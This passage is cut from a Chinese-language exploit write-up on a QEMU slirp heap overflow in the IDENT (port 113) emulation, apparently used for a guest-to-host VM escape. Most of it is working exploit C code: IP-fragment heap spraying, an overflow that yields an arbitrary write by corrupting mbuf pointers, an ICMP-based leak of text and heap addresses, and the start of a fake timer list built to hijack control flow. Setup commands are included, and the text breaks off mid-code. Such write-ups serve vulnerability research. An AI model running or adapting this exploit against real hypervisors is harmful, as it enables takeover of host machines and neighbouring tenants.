size=0x536, sent_cb=0x0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:647#18 0x00005652e9b610a8 in qemu_send_packet (nc=0x5652ed11d1c0, buf=0x7f470a85cc70 "RU\n", size=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:653#19 0x00005652e9abfb84 in e1000_send_packet (s=0x7f470a83a010, buf=0x7f470a85cc70 "RU\n", size=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/hw/net/e1000.c:609#20 0x00005652e9ac0037 in xmit_seg (s=0x7f470a83a010) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/hw/net/e1000.c:661#21 0x00005652e9ac0713 in process_tx_desc (s=0x7f470a83a010, dp=0x7f4707e529a0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/hw/net/e1000.c:756#22 0x00005652e9ac0987 in start_xmit (s=0x7f470a83a010) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/hw/net/e1000.c:811#23 0x00005652e9ac1d2f in set_tctl (s=0x7f470a83a010, index=0xe06, val=0x17) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/hw/net/e1000.c:1184#24 0x00005652e9ac1e97 in e1000_mmio_write (opaque=0x7f470a83a010, addr=0x3818, val=0x17, size=0x4) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/hw/net/e1000.c:1256#25 0x00005652e98f3796 in memory_region_write_accessor (mr=0x7f470a83c8b0, addr=0x3818, value=0x7f4707e52b08, size=0x4, shift=0x0, mask=0xffffffff, attrs=...) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/memory.c:450#26 0x00005652e98f3935 in access_with_adjusted_size (addr=0x3818, value=0x7f4707e52b08, size=0x4, access_size_min=0x4, access_size_max=0x4, access=0x5652e98f3725 &lt;memory_region_write_accessor&gt;, mr=0x7f470a83c8b0, attrs=...) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/memory.c:506#27 0x00005652e98f619c in memory_region_dispatch_write (mr=0x7f470a83c8b0, addr=0x3818, data=0x17, size=0x4, attrs=...) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/memory.c:1158#28 0x00005652e98aa68f in address_space_rw (as=0x5652ea0edf80 &lt;address_space_memory&gt;, addr=0xfebc3818, attrs=..., buf=0x7f470a9c1028 "\027", len=0x4, is_write=0x1) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/exec.c:2439#29 0x00005652e98f0f76 in kvm_cpu_exec (cpu=0x5652ebd34490) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/kvm-all.c:1859#30 0x00005652e98d8aed in qemu_kvm_cpu_thread_fn (arg=0x5652ebd34490) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/cpus.c:979#31 0x00007f47094976ba in start_thread (arg=0x7f4707e53700) at pthread_create.c:333#32 0x00007f47091cd4dd in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109 /slirp/socket.h： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748struct socket &#123; struct socket *so_next,*so_prev; /* For a linked list of sockets */ int s; /* The actual socket */ int pollfds_idx; /* GPollFD GArray index */ Slirp *slirp; /* managing slirp instance */ /* XXX union these with not-yet-used sbuf params */ struct mbuf *so_m; /* Pointer to the original SYN packet, * for non-blocking connect()'s, and * PING reply's */ struct tcpiphdr *so_ti; /* Pointer to the original ti within * so_mconn, for non-blocking connections */ uint32_t so_urgc; union slirp_sockaddr fhost; /* Foreign host */#define so_faddr fhost.sin.sin_addr#define so_fport fhost.sin.sin_port#define so_faddr6 fhost.sin6.sin6_addr#define so_fport6 fhost.sin6.sin6_port#define so_ffamily fhost.ss.ss_family union slirp_sockaddr lhost; /* Local host */#define so_laddr lhost.sin.sin_addr#define so_lport lhost.sin.sin_port#define so_laddr6 lhost.sin6.sin6_addr#define so_lport6 lhost.sin6.sin6_port#define so_lfamily lhost.ss.ss_family uint8_t so_iptos; /* Type of service */ uint8_t so_emu; /* Is the socket emulated? */ uint8_t so_type; /* Type of socket, UDP or TCP */ int32_t so_state; /* internal state flags SS_*, below */ struct tcpcb *so_tcpcb; /* pointer to TCP protocol control block */ u_int so_expire; /* When the socket will expire */ int so_queued; /* Number of packets queued from this socket */ int so_nqueued; /* Number of packets queued in a row * Used to determine when to "downgrade" a session * from fastq to batchq */ struct sbuf so_rcv; /* Receive buffer */ struct sbuf so_snd; /* Send buffer */ void * extra; /* Extra pointer */&#125;; /slirp/sbuf.h： 1234567891011struct sbuf &#123; //用于保存TCP层数据 uint32_t sb_cc; /* actual chars in buffer */ //缓冲区中实际写入的字符数量 uint32_t sb_datalen; /* Length of data */ //缓冲区总大小 char *sb_wptr; /* write pointer. points to where the next * bytes should be written in the sbuf */ //写指针 char *sb_rptr; /* read pointer. points to where the next * byte should be read from the sbuf */ //读指针 char *sb_data; /* Actual data */ //缓冲区的起始地址&#125;;#define sbspace(sb) ((sb)-&gt;sb_datalen - (sb)-&gt;sb_cc) /slirp/mbuf.h： 12345678910111213141516171819202122struct mbuf &#123; //用于保存IP层数据 /* XXX should union some of these! */ /* header at beginning of each mbuf: */ struct mbuf *m_next; /* Linked list of mbufs */ struct mbuf *m_prev; struct mbuf *m_nextpkt; /* Next packet in queue/record */ struct mbuf *m_prevpkt; /* Flags aren't used in the output queue */ int m_flags; /* Misc flags */ int m_size; /* Size of mbuf, from m_dat or m_ext */ struct socket *m_so; caddr_t m_data; /* Current location of data */ int m_len; /* Amount of data in this mbuf, from m_data */ Slirp *slirp; bool resolution_requested; uint64_t expiration_date; char *m_ext; /* start of dynamic buffer area, must be last element */ char m_dat[];&#125;; 漏洞点位于tcp_emu.c:638，其实也不能说是位于，这个漏洞需要多方搭配才能触发： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566inttcp_emu(struct socket *so, struct mbuf *m)&#123; Slirp *slirp = so-&gt;slirp; u_int n1, n2, n3, n4, n5, n6; char buff[257]; uint32_t laddr; u_int lport; char *bptr; ... switch(so-&gt;so_emu) &#123; int x, i; case EMU_IDENT: /* * Identification protocol as per rfc-1413 */ &#123; struct socket *tmpso; struct sockaddr_in addr; socklen_t addrlen = sizeof(struct sockaddr_in); struct sbuf *so_rcv = &amp;so-&gt;so_rcv; //m是mbuf类型,存储用户从IP层传入的数据的结构体,so_rcv是sbuf类型,存储TCP层中数据的结构体 memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len); so_rcv-&gt;sb_wptr += m-&gt;m_len; so_rcv-&gt;sb_rptr += m-&gt;m_len; m-&gt;m_data[m-&gt;m_len] = 0; /* NULL terminate */ if (strchr(m-&gt;m_data, '\r') || strchr(m-&gt;m_data, '\n')) &#123; if (sscanf(so_rcv-&gt;sb_data, "%u%*[ ,]%u", &amp;n1, &amp;n2) == 2) &#123; HTONS(n1); HTONS(n2); /* n2 is the one on our host */ for (tmpso = slirp-&gt;tcb.so_next; tmpso != &amp;slirp-&gt;tcb; tmpso = tmpso-&gt;so_next) &#123; if (tmpso-&gt;so_laddr.s_addr == so-&gt;so_laddr.s_addr &amp;&amp; tmpso-&gt;so_lport == n2 &amp;&amp; tmpso-&gt;so_faddr.s_addr == so-&gt;so_faddr.s_addr &amp;&amp; tmpso-&gt;so_fport == n1) &#123; if (getsockname(tmpso-&gt;s, (struct sockaddr *)&amp;addr, &amp;addrlen) == 0) n2 = ntohs(addr.sin_port); break; &#125; &#125; &#125; so_rcv-&gt;sb_cc = snprintf(so_rcv-&gt;sb_data, so_rcv-&gt;sb_datalen, "%d,%d\r\n", n1, n2); so_rcv-&gt;sb_rptr = so_rcv-&gt;sb_data; so_rcv-&gt;sb_wptr = so_rcv-&gt;sb_data + so_rcv-&gt;sb_cc; &#125; m_free(m); return 0; &#125; case EMU_FTP: /* ftp */ .... case EMU_KSH: ... case EMU_IRC: ... case EMU_REALAUDIO: ... &#125; 漏洞利用在跑exp之前，需要先用这个命令将网卡enp0s3的mtu变大：ifconfig enp0s3 mtu 9000 up 漏洞利用比较复杂，主要分四个阶段： Malloc Primitive由于溢出发生处是在一块堆上的纯buffer，前后的数据在实际运行中都是不稳定的，所以首先需要一个适当的手段来控制堆。这一步是及其重要的，我个人感觉这一步也是实际漏洞中的利用手法和CTF最大的差别，CTF就是比较稳定，然后堆的状态是完全可控的，所以直接去想怎么利用就行了，而实际漏洞的堆因为多方面原因导致其是非常混乱的。。。所以使堆变得稳定是非常非常重要的一步。。。 具体原理为： 在ip_input函数中的以下部分代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950... if (ip-&gt;ip_off &amp;~ IP_DF) &#123; //ip-&gt;ip_off不包含IP_DF(Don't Fragment)标志位才能触发ip_reass register struct ipq *fp; struct qlink *l; /* * Look for queue of fragments * of this datagram. */ for (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link; l = l-&gt;next) &#123; fp = container_of(l, struct ipq, ip_link); if (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp; //发送大量id不同的数据包,使if条件无法满足,进而找不到之前的数据包,导致fp为NULL ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp; ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp; ip-&gt;ip_p == fp-&gt;ipq_p) goto found; &#125; fp = NULL; found: /* * Adjust ip_len to not reflect header, * set ip_mff if more fragments are expected, * convert offset of this to bytes. */ ip-&gt;ip_len -= hlen; if (ip-&gt;ip_off &amp; IP_MF) //含有IP_MF(More Fragment)标志位时,ip_tos带有1,不含有时ip_tos不带有1 ip-&gt;ip_tos |= 1; else ip-&gt;ip_tos &amp;= ~1; ip-&gt;ip_off &lt;&lt;= 3; /* * If datagram marked as having more fragments * or if this is not the first fragment, * attempt reassembly; if it succeeds, proceed. */ if (ip-&gt;ip_tos &amp; 1 || ip-&gt;ip_off) &#123; ip = ip_reass(slirp, ip, fp);//我们的目的是使fp=NULL的时候,进入ip_reass函数 if (ip == NULL) return; m = dtom(slirp, ip); &#125; else if (fp) ip_freef(slirp, fp); &#125; else ip-&gt;ip_len -= hlen;... 在ip_reass中，fp == NULL时会进入这段代码，会调用m_get申请一个新的mbuf结构体： 123456789101112131415161718//ip_input.c:254 if (fp == NULL) &#123; struct mbuf *t = m_get(slirp); //利用这里触发堆喷 if (t == NULL) &#123; goto dropfrag; &#125; fp = mtod(t, struct ipq *); insque(&amp;fp-&gt;ip_link, &amp;slirp-&gt;ipq.ip_link); fp-&gt;ipq_ttl = IPFRAGTTL; fp-&gt;ipq_p = ip-&gt;ip_p; fp-&gt;ipq_id = ip-&gt;ip_id; fp-&gt;frag_link.next = fp-&gt;frag_link.prev = &amp;fp-&gt;frag_link; fp-&gt;ipq_src = ip-&gt;ip_src; fp-&gt;ipq_dst = ip-&gt;ip_dst; q = (struct ipasfrag *)fp; goto insert; &#125; 在m_get里会申请内存： 123456789101112131415161718struct mbuf *m_get(Slirp *slirp)&#123; register struct mbuf *m; int flags = 0; DEBUG_CALL("m_get"); if (slirp-&gt;m_freelist.qh_link == &amp;slirp-&gt;m_freelist) &#123; m = g_malloc(SLIRP_MSIZE); // &lt; ------ here !!! slirp-&gt;mbuf_alloced++; if (slirp-&gt;mbuf_alloced &gt; MBUF_THRESH) flags = M_DOFREE; m-&gt;slirp = slirp; &#125; else &#123; m = (struct mbuf *) slirp-&gt;m_freelist.qh_link; remque(m); &#125; m_get函数里申请内存的地方，申请的内存size固定为0x668，也就是mbuf的size： 但是到这还没完，需要理解函数栈返回时的流程，在ip_reass中，上面那部分代码会直接goto insert： 123456789101112131415insert: /* * Stick new segment in its place; * check for complete reassembly. */ ip_enq(iptofrag(ip), q-&gt;ipf_prev); next = 0; for (q = fp-&gt;frag_link.next; q != (struct ipasfrag*)&amp;fp-&gt;frag_link; q = q-&gt;ipf_next) &#123; if (q-&gt;ipf_off != next) return NULL; next += q-&gt;ipf_len; &#125; if (((struct ipasfrag *)(q-&gt;ipf_prev))-&gt;ipf_tos &amp; 1) return NULL; //若后续还有IP分片(IP_MF位为1),则直接返回NULL 然后看ip_input函数里： 1234567891011 if (ip-&gt;ip_tos &amp; 1 || ip-&gt;ip_off) &#123; ip = ip_reass(slirp, ip, fp); if (ip == NULL) return; //这里会直接返回,所以不会有干扰的情况发生 m = dtom(slirp, ip); &#125; else if (fp) ip_freef(slirp, fp);&#125; else ip-&gt;ip_len -= hlen; 所以我们需要构造许多ip_header含有IP_MF不含有IP_DF的，且id字段全都不同的数据包来触发大量的malloc原语使堆变得可控。 PS：并不是所有size的chunk大量喷射都会使堆变得稳定，只是这个情况比较巧合，正好之后我们要溢出的结构体chunk的size全都大于等于0x668，所以其才可以起到清理作用。 构造的数据包在gdb中如下，随便截的某一个包： Arbitary write首先需要知道的是，这一步能否成功取决于上一步的堆是否可以成功清理，以下分析皆为基于堆稳定后的利用。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111voidip_input(struct mbuf *m)&#123; ... /* * If offset or IP_MF are set, must reassemble. * Otherwise, nothing need be done. * (We could look in the reassembly queue to see * if the packet was previously fragmented, * but it's not worth the time; just let them time out.) * * XXX This should fail, don't fragment yet */ ... if (ip-&gt;ip_off &amp;~ IP_DF) &#123; //ip-&gt;ip_off不包含IP_DF(Don't Fragment)标志位才能触发ip_reass register struct ipq *fp; struct qlink *l; /* * Look for queue of fragments * of this datagram. */ for (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link; l = l-&gt;next) &#123; fp = container_of(l, struct ipq, ip_link); if (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp; //发送大量id不同的数据包,使if条件无法满足,进而找不到之前的数据包,导致fp为NULL ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp; ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp; ip-&gt;ip_p == fp-&gt;ipq_p) goto found; &#125; fp = NULL; found: /* * Adjust ip_len to not reflect header, * set ip_mff if more fragments are expected, * convert offset of this to bytes. */ ip-&gt;ip_len -= hlen; if (ip-&gt;ip_off &amp; IP_MF) //含有IP_MF(More Fragment)标志位时,ip_tos带有1,不含有时ip_tos不带有1 ip-&gt;ip_tos |= 1; else ip-&gt;ip_tos &amp;= ~1; ip-&gt;ip_off &lt;&lt;= 3; /* * If datagram marked as having more fragments * or if this is not the first fragment, * attempt reassembly; if it succeeds, proceed. */ if (ip-&gt;ip_tos &amp; 1 || ip-&gt;ip_off) &#123; ip = ip_reass(slirp, ip, fp);//我们的目的是使fp=NULL的时候,进入ip_reass函数 if (ip == NULL) return; m = dtom(slirp, ip); &#125; else if (fp) ip_freef(slirp, fp); &#125; else ip-&gt;ip_len -= hlen; ...&#125;static struct ip *ip_reass(Slirp *slirp, struct ip *ip, struct ipq *fp)&#123; register struct mbuf *m = dtom(slirp, ip); register struct ipasfrag *q; int hlen = ip-&gt;ip_hl &lt;&lt; 2; int i, next; ... /* * Reassembly is complete; concatenate fragments. */ if (((struct ipasfrag *)(q-&gt;ipf_prev))-&gt;ipf_tos &amp; 1) return NULL; //若后续还有IP分片(IP_MF位为1),则直接返回NULL,若IP_MF不为1则表示当前分片是最后一个分片,可以开始进行分片的重组了,进入下面的代码 q = fp-&gt;frag_link.next; m = dtom(slirp, q); q = (struct ipasfrag *) q-&gt;ipf_next; while (q != (struct ipasfrag*)&amp;fp-&gt;frag_link) &#123; struct mbuf *t = dtom(slirp, q); q = (struct ipasfrag *) q-&gt;ipf_next; m_cat(m, t); //分片的拼接函数 &#125;&#125;/* * Copy data from one mbuf to the end of * the other.. if result is too big for one mbuf, allocate * an M_EXT data segment */voidm_cat(struct mbuf *m, struct mbuf *n)&#123; /* * If there's no room, realloc */ if (M_FREEROOM(m) &lt; n-&gt;m_len) m_inc(m, m-&gt;m_len + n-&gt;m_len); memcpy(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len); //任意地址写任意值 m-&gt;m_len += n-&gt;m_len; m_free(n);&#125; 当数据包是最后一个切片数据包时（IP_MF不为1），ip_reass函数中会调用m_cat将数据包组合起来。关键代码是memcpy(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len)，如果我们可以利用堆溢出覆盖m结构体的m_data和m_len，则就可以实现将可控的数据n-&gt;m_data写到任意的地址m-&gt;m_data+m-&gt;m_len处。 exp中任意地址写函数关键代码如下，首先利用malloc原语将清空堆，使得堆排布可控。接着利用与host主机113端口建立socket连接，申请出来可溢出的struct sbuf *so_rcv结构体。紧接着在后面分配一个ip切片数据包mbuf，其id为0xdead。由于堆的排布，该数据包是紧贴着so_rcv的，可以利用堆溢出覆盖mbuf中的m_data指针。最后再次发送相同id(0xdead)并且IP_MF标志为0的数据包，memcpy拷贝至m_data指针处时，实现任意地址写，因为ip-&gt;ip_off设为0x318，所以实际上是向addr+0x318的地址写数据。 需要注意的是每次arbitrary_write函数之后，server的连接都会断开一次，因为函数最后里把建立了连接的fd给close了，为了之后的利用我们需要把server重新设为监听状态，这也是我为什么在函数最后加了一个getchar()，这是为了重新让server重新运行sudo nc -lvv 113命令再继续运行exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677int arbitrary_write(uint64_t addr, int addr_len, uint8_t *write_data, int write_data_len, int spray_times) &#123; int s, len, i; struct sockaddr_in ip_addr; int ret; struct ip_pkt_info pkt_info; uint8_t *payload = (uint8_t *)malloc(IP_MAXPACKET); uint8_t *payload_start = payload; uint32_t *payload32 = (uint32_t *)payload; uint64_t *payload64 = (uint64_t *)payload; memset(payload, 'A', 0x1000); for (i = 0; i &lt; spray_times; ++i) &#123; dbg_printf("spraying size 0x2000, id: %d\n", i); spray(0x2000, g_spray_ip_id + i); &#125; dbg_printf("spray finished.\n"); //堆喷将堆变得稳定 s = socket(AF_INET, SOCK_STREAM, 0); ip_addr.sin_family = AF_INET; ip_addr.sin_addr.s_addr = inet_addr(host); ip_addr.sin_port = htons(113); // vulnerable port len = sizeof(struct sockaddr_in); ret = connect(s, (struct sockaddr *)&amp;ip_addr, len); if (ret == -1) &#123; perror("oops: client"); exit(1); &#125; //创建出可溢出的so_rcv结构体 pkt_info.ip_id = 0xdead; pkt_info.ip_off = 0; pkt_info.MF = 1; pkt_info.ip_p = 0xff; send_ip_pkt(&amp;pkt_info, payload, 0x300 + 4); //这个packet就在so_rcv的后面 for (i = 0; i &lt; 6; ++i) &#123; write(s, payload, 0x500); // 不能send一个满的m_buf，因为会有一个off by null = =。。。。 usleep(20000); // 不知道为啥，貌似内核会合并包？ // 如果合并了就会off by null... // 所以sleep一下 dbg_printf("send %d complete\n", i + 1); &#125; write(s, payload, 1072); //从for循环到这里的六次write是为了填充so_rcv到我们要溢出的m_buf之间的无用数据 // actual overflow here *payload64++ = 0; *payload64++ = 0x675; // chunk header *payload64++ = 0; // m_next *payload64++ = 0; // m_prev *payload64++ = 0; // m_nextpkt *payload64++ = 0; // m_prevpkt payload32 = (uint32_t *)payload64; *payload32++ = 0; // m_flags *payload32++ = 0x608; // m_size payload64 = (uint64_t *)payload32; *payload64++ = 0; // m_so payload = (uint8_t *)payload64; assert(addr_len &lt;= 8); for (i = 0; i &lt; addr_len; ++i) &#123; *payload++ = (addr &gt;&gt; (i * 8)) &amp; 0xff; // m_data &#125; write(s, payload_start, (uint8_t *)payload - payload_start); //真正的溢出,在这一步覆盖掉第一个分片的各个数据结构 // write(s, payload, 0x1000); pkt_info.ip_id = 0xdead; pkt_info.ip_off = 0x300 + 24; //实际上是向addr+0x318的地址写任意值 pkt_info.MF = 0; //设为0,触发m_cat pkt_info.ip_p = 0xff; send_ip_pkt(&amp;pkt_info, write_data, write_data_len); //触发任意地址写任意值!!! close(s); free(payload_start); if (stop_flag) &#123; puts("trigger!"); getchar(); &#125; return 0;&#125; Infoleak前两步如果成功了的话，这一步就几乎百分之百成功，只是泄露出来的数据貌似无法预测，没什么标志性数据，每次接受到的几乎都是不一样的数据，这也是导致了最后的成功率很低的原因之一。 泄露的原理使用的是伪造ICMP协议数据包： 先用一次任意地址写任意值在堆的前面(低位为0x000b00)写入一个伪造的ICMP包头，也就是main函数最开始做的事情。 发送一个ICMP请求，IP_MF位置1。 第二次溢出修改第二步的mbuf的m_data的低位至第一步伪造的ICMP包头的起始地址，这一步实际上完成了一个ICMP包的伪造，因为堆前面的那个地方我们只伪造了一个ICMP数据包的头部，真实的数据部分除了我们的命令之外就是脏数据了，也是最后ICMP应答包的数据来源。 发送IP_MF 为0，payloadlen为0的包结束ICMP请求。 得到ICMP应答包，得到脏数据。 所以这一步的目的不在于写，而是溢出改ICMP第一个分片的mbuf-&gt;m_data为第一步伪造的ICMP_header，写只是为了结束ICMP请求罢了，所以payloadlen为0。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185void leak(uint64_t addr, int addr_len) &#123; int s, len, i, recvsd; struct sockaddr_in ip_addr; int ret; struct ip_pkt_info pkt_info; uint8_t *payload = (uint8_t *)malloc(IP_MAXPACKET); uint8_t *payload_start = payload; uint32_t *payload32 = (uint32_t *)payload; uint64_t *payload64 = (uint64_t *)payload; memset(payload, 'A', 0x1000); dbg_printf("in leak_text...\n"); for (i = 0; i &lt; 0x20; ++i) &#123; dbg_printf("spraying size 0x2000, id: %d\n", i); spray(0x2000, g_spray_ip_id + i); &#125; dbg_printf("spray finished.\n"); //堆喷使堆变得稳定 // getchar(); s = socket(AF_INET, SOCK_STREAM, 0); ip_addr.sin_family = AF_INET; ip_addr.sin_addr.s_addr = inet_addr(host); ip_addr.sin_port = htons(113); // vulnerable port len = sizeof(struct sockaddr_in); ret = connect(s, (struct sockaddr *)&amp;ip_addr, len); //构造可以溢出的sp_rcv if (ret == -1) &#123; perror("0ops: client"); exit(1); &#125; pkt_info.ip_id = 0xdead; pkt_info.ip_off = 0; pkt_info.MF = 1; pkt_info.ip_p = IPPROTO_ICMP; //注意这里为ICMP协议数据包 send_ip_pkt(&amp;pkt_info, payload, 0x300 + 4); // 这个packet就在so_rcv的后面 /* let's overflow here! send(xxx) */ for (i = 0; i &lt; 6; ++i) &#123; write(s, payload, 0x500); // 不能send一个满的m_buf，因为会有一个off by null = =。。。。 usleep(20000); // 不知道为啥，貌似内核会合并包？ // 如果合并了就会off by null... // 所以sleep一下 dbg_printf("send %d complete\n", i + 1); &#125; write(s, payload, 1072); //填充无用数据,参见上一步 // actual overflow here *payload64++ = 0; *payload64++ = 0x675; // chunk header *payload64++ = 0; // m_next *payload64++ = 0; // m_prev *payload64++ = 0; // m_nextpkt *payload64++ = 0; // m_prevpkt payload32 = (uint32_t *)payload64; *payload32++ = 0; // m_flags *payload32++ = 0x608; // m_size payload64 = (uint64_t *)payload32; *payload64++ = 0; // m_so payload = (uint8_t *)payload64; assert(addr_len &lt;= 8); for (i = 0; i &lt; addr_len; ++i) &#123; *payload++ = (addr &gt;&gt; (i * 8)) &amp; 0xff; // m_data &#125; write(s, payload_start, (uint8_t *)payload - payload_start); //修改m_data的低位至之前伪造的包头地址 // write(s, payload, 0x1000); dbg_printf("trigger reass!"); // getchar(); memset(payload,'A',0x1000); //这一步的payload无关紧要,所以可以随意填,传的时候payloadlen传0即可 pkt_info.ip_id = 0xdead; pkt_info.ip_off = 0x300 + 24; pkt_info.MF = 0; //MF置为0结束ICMP请求 pkt_info.ip_p = IPPROTO_ICMP; //注意为ICMP协议数据包 recvsd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)); //在ICMP请求结束前建立socket,结束后就接收不到应答包了 send_ip_pkt(&amp;pkt_info, payload, 0); //payloadlen为0,结束ICMP请求 // we receive data here int bytes, status; struct ip *recv_iphdr; struct icmp *recv_icmphdr; uint8_t recv_ether_frame[IP_MAXPACKET]; struct sockaddr from; socklen_t fromlen; struct timeval wait, t1, t2; struct timezone tz; double dt; (void)gettimeofday(&amp;t1, &amp;tz); wait.tv_sec = 2; wait.tv_usec = 0; setsockopt(recvsd, SOL_SOCKET, SO_RCVTIMEO, (char *)&amp;wait, sizeof(struct timeval)); recv_iphdr = (struct ip *)(recv_ether_frame + ETH_HDRLEN); recv_icmphdr = (struct icmp *)(recv_ether_frame + ETH_HDRLEN + IP4_HDRLEN); int count = 0; while (1) &#123; memset(recv_ether_frame, 0, IP_MAXPACKET * sizeof(uint8_t)); memset(&amp;from, 0, sizeof(from)); fromlen = sizeof(from); if ((bytes = recvfrom(recvsd, recv_ether_frame, IP_MAXPACKET, 0, (struct sockaddr *)&amp;from, &amp;fromlen)) &lt; 0) &#123; status = errno; if (status == EAGAIN) &#123; // EAGAIN = 11 dbg_printf("No reply within %li seconds.\n", wait.tv_sec); exit(EXIT_FAILURE); &#125; else if (status == EINTR) &#123; // EINTR = 4 continue; &#125; else &#123; perror("recvfrom() failed "); exit(EXIT_FAILURE); &#125; &#125; // End of error handling conditionals. // hexdump("recv", recv_ether_frame, 0x50); dbg_printf("recv count %d\n", count++); if ((((recv_ether_frame[12] &lt;&lt; 8) + recv_ether_frame[13]) == ETH_P_IP) &amp;&amp; (recv_iphdr-&gt;ip_p == IPPROTO_ICMP) &amp;&amp; (recv_icmphdr-&gt;icmp_type == ICMP_ECHOREPLY)) &#123; // Stop timer and calculate how long it took to get a reply. (void)gettimeofday(&amp;t2, &amp;tz); dt = (double)(t2.tv_sec - t1.tv_sec) * 1000.0 + (double)(t2.tv_usec - t1.tv_usec) / 1000.0; // 底下这个可能会segfault // if (inet_ntop(AF_INET, &amp;(recv_iphdr-&gt;ip_src.s_addr), rec_ip, // INET_ADDRSTRLEN) == NULL) &#123; // status = errno; // fprintf(stderr, "inet_ntop() failed.\nError message: %s", // strerror(status)); exit(EXIT_FAILURE); // &#125; dbg_printf("%g ms (%i bytes received)\n", dt, bytes);#ifdef DEBUG hexdump("ping recv", recv_ether_frame, bytes);#endif if (bytes &lt; 0x200) continue; //7e 64 cb 55 55 55 //text_base = // ((*(uint64_t *)(recv_ether_frame + 0x88)) - 0x76247e) &amp; ~0xfff; //heap_base = (*(uint64_t *)(recv_ether_frame + 0x90)) &amp; ~0xffffff; text_base = 0; heap_base = 0; uint64_t* tmp_ptr = NULL; uint64_t tmp_addr = 0; for(int i = 0;i &lt; 846;i += 8)&#123; tmp_ptr = recv_ether_frame + i; tmp_addr = *tmp_ptr; if(text_base != 0 &amp;&amp; heap_base != 0)&#123; break; &#125; printf("%d: %p\n",i,tmp_addr); if(tmp_addr &gt; 0x550000000000 &amp;&amp; ((tmp_addr&amp;0xfff) == 0x47e))&#123; text_base = tmp_addr - 0x76247e; heap_base = (*(uint64_t*)(recv_ether_frame + i + 8)) &amp; ~0xffffff; &#125; &#125; if(text_base == 0)&#123; perror("leak error...."); exit(-1); &#125; //getchar(); dbg_printf("leak text_base: 0x%lx\n" "leak heap_base: 0x%lx\n", text_base, heap_base); // getchar(); break; &#125; // End if IP ethernet frame carrying ICMP_ECHOREPLY &#125; close(s); close(recvsd); free(payload_start); if(stop_flag)&#123; puts("trigger!"); getchar(); &#125; return;&#125; PC control关于qemu计时器方面的知识可以看我之前的文章。 在bss段有个全局数组main_loop_tlg，它是QEMUTimerList的数组。我们可以在堆中伪造一个QEMUTimerList，将cb指针覆盖成想要执行的函数，opaque为参数地址。再将其地址覆盖到main_loop_tlg中，等expire_time时间到，将会执行cb(opaque)，成功控制程序执行流。 1234567891011121314151617181920212223// util/qemu-timer.cstruct QEMUTimerList &#123; QEMUClock *clock; QemuMutex active_timers_lock; QEMUTimer *active_timers; QLIST_ENTRY(QEMUTimerList) list; QEMUTimerListNotifyCB *notify_cb; void *notify_opaque; /* lightweight method to mark the end of timerlist's running */ QemuEvent timers_done_ev;&#125;;// include/qemu/timer.hstruct QEMUTimer &#123; int64_t expire_time; /* in nanoseconds */ QEMUTimerList *timer_list; QEMUTimerCB *cb; // 函数指针 void *opaque; // 参数 QEMUTimer *next; int attributes; int scale;&#125;; exp中对应的部分： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// fake timer_list/* gdb-peda$ p *timer_list$45 = &#123; clock = 0x55a8d1473380 &lt;qemu_clocks&gt;, active_timers_lock = &#123; lock = pthread_mutex_t = &#123; Type = Normal, Status = Not acquired, Robust = No, Shared = No, Protocol = None &#125;, file = 0x0, line = 0x0, initialized = 0x1 &#125;, active_timers = 0x55a8d3641df0, list = &#123; le_next = 0x0, le_prev = 0x55a8d2594cb8 &#125;, notify_cb = 0x55a8d076c793 &lt;qemu_timer_notify_cb&gt;, notify_opaque = 0x0, timers_done_ev = &#123; value = 0x0, initialized = 0x1 &#125;&#125; */uint64_t fake_timer_list = heap_base + 0x1000;*(uint64_t *)buf = text_base + 0x11f8e80; // qemu_clocks 0x11f8e80memset(buf + 8, 0, 8 * 6);*(uint64_t *)(buf + 0x38) = 0x0000000100000000;*(uint64_t *)(buf + 0x40) = fake_timer_list + 0x70; // active_timers*(uint64_t *)(buf + 0x48) = 0;*(uint64_t *)(buf + 0x50) = 0;*(uint64_t *)(buf + 0x58) = text_base + 0x2f2ee0; // qemu_timer_notify_cb 0x2f2ee0*(uint64_t *)(buf + 0x60) = 0;*(uint64_t 